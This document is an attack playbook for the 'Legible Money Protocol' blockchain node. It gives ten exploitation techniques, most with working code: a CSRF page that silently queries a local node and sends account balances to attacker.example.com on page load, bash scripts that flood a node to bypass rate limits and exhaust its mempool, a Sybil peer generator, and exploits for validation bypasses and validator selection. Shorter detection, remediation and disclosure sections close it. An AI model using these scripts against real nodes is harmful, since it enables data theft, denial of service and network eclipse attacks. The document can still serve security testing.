# Attack Playbook: Legible Money Protocol

**Purpose:** Security testing and penetration testing reference
**Classification:** INTERNAL USE ONLY - DO NOT DISTRIBUTE

---

## Exploitation Techniques

### 1. CSRF Attack via CORS Misconfiguration

**Target:** Any user running a local node with default configuration

**Setup:**
```html
<!-- save as exploit.html and host on any webserver -->
<!DOCTYPE html>
<html>
<head><title>Legible Money CSRF PoC</title></head>
<body>
<h1>Loading game...</h1>
<script>
// Configuration
const TARGET = 'http://localhost:8545';
const EXFIL = 'https://attacker.example.com/log';

// Helper to make RPC calls
async function rpc(method, params = {}) {
  const res = await fetch(TARGET, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', method, params, id: Date.now()})
  });
  return res.json();
}

// Exfiltrate data
async function exfil(data) {
  navigator.sendBeacon(EXFIL, JSON.stringify(data));
}

// Attack sequence
async function attack() {
  try {
    // 1. Check if node is accessible
    const health = await rpc('network_health');
    console.log('Node accessible:', health);

    // 2. Enumerate accounts (if implemented)
    // const accounts = await rpc('account_list');

    // 3. Get balance of known DIDs
    const targets = [
      'did:lgm:faucet',
      'did:lgm:treasury',
      'did:lgm:research',
      'did:lgm-devnet:validator-1'
    ];

    for (const did of targets) {
      const balance = await rpc('account_getBalance', {did});
      await exfil({type: 'balance', did, balance: balance.result});
    }

    // 4. Get pending verifications (validator info leak)
    // const pending = await rpc('verification_getPending', {validatorKey: '...'});

  } catch (e) {
    console.log('Attack failed:', e);
  }
}

// Run on page load
attack();
</script>
</body>
</html>
```

**Mitigation Test:**
After fixing CORS, the same page should fail with CORS errors.

---

### 2. Rate Limit Bypass Attack

**Target:** Any public-facing node

**Script:**
```bash
#!/bin/bash
# rate_limit_bypass.sh - DoS via header spoofing

TARGET="${1:-http://localhost:8545}"
REQUESTS="${2:-10000}"

echo "Starting rate limit bypass attack on $TARGET"
echo "Sending $REQUESTS requests..."

for i in $(seq 1 $REQUESTS); do
  # Generate random IP for each request
  FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"

  curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -d '{"jsonrpc":"2.0","method":"network_health","params":{},"id":1}' \
    > /dev/null &

  # Don't overwhelm local system
  if (( i % 100 == 0 )); then
    wait
    echo "Sent $i requests..."
  fi
done

wait
echo "Attack complete"
```

**Verification:**
```bash
# Monitor target node's resource usage during attack
# Without fix: Node should become unresponsive
# With fix: Node should return 429 after rate limit
```

---

### 3. Transaction Malleability Attack

**Target:** Transactions in mempool

**Concept:**
Since signatures only cover payload, a malicious block producer can:
1. Intercept transaction in mempool
2. Modify fee field
3. Include modified transaction in block

**Pseudocode:**
```typescript
// Malicious block producer code
function malleateTransaction(tx: Transaction): Transaction {
  // Increase fee to maximum that sender can afford
  const senderBalance = getBalance(tx.sender);
  const maxFee = senderBalance - getPayloadCost(tx);

  return {
    ...tx,
    fee: maxFee  // Signature doesn't cover this!
  };
}
```

**Detection:**
Compare submitted fee vs executed fee in receipts.

---

### 4. Deprecated Function Exploitation

**Target:** Verification round participation

**Attack Flow:**
```typescript
// Exploit: Participate in verification without valid VRF selection

import { addCommitment } from './verification_round';

// Attacker has minimal stake but can participate in ALL rounds
async function exploitVerification(round: VerificationRound) {
  // Generate commitment (doesn't matter if we're not VRF-selected)
  const commitment = {
    validator: attackerPublicKey,
    commitment: sha256(`my_vote:${round.id}`),
    submittedAt: Date.now(),
    signature: sign(`${round.id}:${commitment}`, attackerPrivateKey),
    // NOTE: No VRF proof needed for deprecated function!
  };

  // Call deprecated function directly
  const result = addCommitment(round, commitment, currentBlock);

  if (result.accepted) {
    console.log('Illegitimate participation accepted!');
  }
}
```

---

### 5. Delegation Lock Attack

**Target:** Users who delegate stake

**Attack Scenario:**
1. Create malicious validator with attractive 0% commission
2. Market heavily to attract delegations
3. Once significant funds delegated, become unresponsive
4. Users cannot undelegate (not implemented)
5. Profit from locked stake's voting power

**Verification:**
```typescript
// Test that undelegation doesn't work
const tx = createUndelegateTransaction(myDid, validatorPubKey, amount);
const result = await submitTransaction(tx);

// Check: did my delegation actually decrease?
const delegation = await getDelegation(myDid, validatorPubKey);
// If delegation unchanged, attack confirmed
```

---

### 6. Test Fallback Exploitation

**Target:** Nodes where stateIntegration fails to initialize

**Conditions:**
- Node starts without proper state integration
- Fallback paths activated

**Exploitation:**
```typescript
// When stateIntegration is null, validation is bypassed

// 1. Submit invalid nonce
const tx = {
  sender: anyKey,
  nonce: 99999n,  // Wrong nonce
  fee: 0n,
  type: 'transfer',
  payload: { to: attackerDid, amount: 1000000n },
  signature: sign(payload)
};

// Without stateIntegration: transaction accepted!
// validateTransaction returns { valid: true } in fallback

// 2. Submit transactions without balance
// Sender has 0 balance but transfer succeeds in fallback
```

---

### 7. Sybil Attack on P2P Network

**Target:** Network peer discovery

**Script:**
```typescript
// sybil.ts - Create many fake peer identities

import { createLibp2p } from 'libp2p';
import { noise } from '@chainsafe/libp2p-noise';
import { yamux } from '@chainsafe/libp2p-yamux';
import { tcp } from '@libp2p/tcp';

async function createSybilPeers(count: number, targetMultiaddr: string) {
  const peers = [];

  for (let i = 0; i < count; i++) {
    const node = await createLibp2p({
      transports: [tcp()],
      connectionEncrypters: [noise()],
      streamMuxers: [yamux()],
    });

    await node.start();
    await node.dial(targetMultiaddr);

    peers.push(node);
    console.log(`Created Sybil peer ${i + 1}/${count}`);
  }

  return peers;
}

// Create 1000 Sybil peers connecting to target
createSybilPeers(1000, '/ip4/TARGET_IP/tcp/26656');
```

**Goal:**
- Eclipse target node from honest network
- Delay block/transaction propagation
- Partition target for double-spend attack

---

### 8. Claim ID Collision Attack

**Target:** Verification round deduplication

**Attack:**
```typescript
// Submit same claim in rapid succession to create collision

const claim = {
  claim: 'Water boils at 100C at sea level',
  domain: 'physics.thermodynamics',
  submitter: attackerKey,
  stake: minStake,
  submittedAt: Date.now(),
  references: [],
};

// Submit to multiple nodes simultaneously
await Promise.all(
  nodes.map(node => node.submitClaim(claim))
);

// If deduplication is by ID only, multiple rounds may start
// Attacker can vote differently in each round
```

---

### 9. VRF Seed Prediction Attack

**Target:** Validator selection fairness

**Attack:**
```typescript
// Pre-calculate VRF outputs for future blocks

async function predictSelections(
  validatorKey: PrivateKey,
  currentBlock: bigint,
  blocksAhead: number
) {
  const predictions = [];

  for (let i = 1; i <= blocksAhead; i++) {
    const futureBlock = currentBlock + BigInt(i);
    // Seed is predictable: prevHash:blockNum:epoch
    // prevHash is known after each block
    // blockNum is sequential
    // epoch changes at known intervals

    const seed = generateBlockSeed(
      getCurrentBlockHash(),  // Will change
      futureBlock,
      calculateEpoch(futureBlock)
    );

    const { output } = vrfGenerate(seed, validatorKey);
    const { selected } = isValidatorSelected(output, myStake, totalStake, 1);

    predictions.push({ block: futureBlock, selected });
  }

  return predictions;
}

// Use predictions to optimize:
// - When to go offline (if not selected)
// - When to attempt attacks (if selected for consecutive blocks)
```

---

### 10. Memory Exhaustion via Unbounded Mempool

**Target:** Node memory

**Script:**
```bash
#!/bin/bash
# mempool_flood.sh - Exhaust mempool memory

TARGET="${1:-http://localhost:8545}"

echo "Flooding mempool with transactions..."

# Generate many small transactions
for i in $(seq 1 100000); do
  # Create unique payload to avoid dedup
  PAYLOAD='{"to":"did:lgm:target","amount":"1","data":"'$RANDOM$RANDOM$RANDOM'"}'

  curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d '{
      "jsonrpc":"2.0",
      "method":"transaction_submit",
      "params":{
        "type":"transfer",
        "sender":"attacker_key",
        "payload":'"$PAYLOAD"'
      },
      "id":'$i'
    }' > /dev/null &

  if (( i % 1000 == 0 )); then
    wait
    echo "Submitted $i transactions..."
  fi
done
```

---

## Detection Scripts

### Detect CORS Vulnerability
```bash
#!/bin/bash
# test_cors.sh

TARGET="${1:-http://localhost:8545}"

# Test with evil origin
RESPONSE=$(curl -s -I -X OPTIONS "$TARGET" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST")

if echo "$RESPONSE" | grep -q "Access-Control-Allow-Origin: \*"; then
  echo "VULNERABLE: CORS allows all origins"
else
  echo "SAFE: CORS restricted"
fi
```

### Detect Rate Limit Bypass
```bash
#!/bin/bash
# test_ratelimit.sh

TARGET="${1:-http://localhost:8545}"
LIMIT=100

for i in $(seq 1 $LIMIT); do
  FAKE_IP="$i.$i.$i.$i"
  RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
    -X POST "$TARGET" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -d '{"jsonrpc":"2.0","method":"network_health","id":1}')

  if [ "$RESPONSE" == "429" ]; then
    echo "Rate limit triggered at request $i - checking if bypass works..."
    break
  fi
done

echo "Sent $LIMIT requests without 429 = VULNERABLE to rate limit bypass"
```

---

## Remediation Verification

### After Fixing CORS
```bash
# Should fail with CORS error
curl -X POST http://localhost:8545 \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"network_health","id":1}'
```

### After Fixing Rate Limits
```bash
# Should get 429 after threshold
for i in {1..100}; do
  curl -s http://localhost:8545 -d '{"jsonrpc":"2.0","method":"network_health","id":1}'
done
# Last requests should return 429
```

### After Implementing Undelegation
```typescript
// Undelegation should reduce delegation
const before = await getDelegation(did, validator);
await undelegate(did, validator, amount);
const after = await getDelegation(did, validator);
assert(after.amount < before.amount);
```

---

## Responsible Disclosure

If you discover these vulnerabilities in a production deployment:

1. **Do NOT exploit** on mainnet
2. **Report immediately** to security@legiblemoney.io
3. **Include:**
   - Detailed steps to reproduce
   - Potential impact assessment
   - Suggested remediation
4. **Wait for acknowledgment** before any public disclosure

---

*This document is for authorized security testing only. Unauthorized access to computer systems is illegal.*
